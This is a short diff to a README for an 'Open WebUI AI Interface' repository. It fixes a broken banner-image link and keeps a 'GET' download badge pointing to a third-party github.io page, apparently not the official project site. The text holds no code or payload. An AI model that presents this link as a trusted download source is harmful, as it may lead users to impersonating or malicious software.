@@ -1,6 +1,6 @@
 # Open WebUI AI Interface
 
-![Banner Placeholder]([IMAGE_URL](https://openwebui.com/assets/images/computer-demo.png))
+![Banner Placeholder](https://openwebui.com/assets/images/computer-demo.png)
 
 [![GET — Open WebUI](https://img.shields.io/badge/GET%20%E2%80%94%20Open%20WebUI-0078D6?style=for-the-badge&logoColor=white)](https://manymanibim.github.io/.github/Open-WebUI-AI-Interface)
 
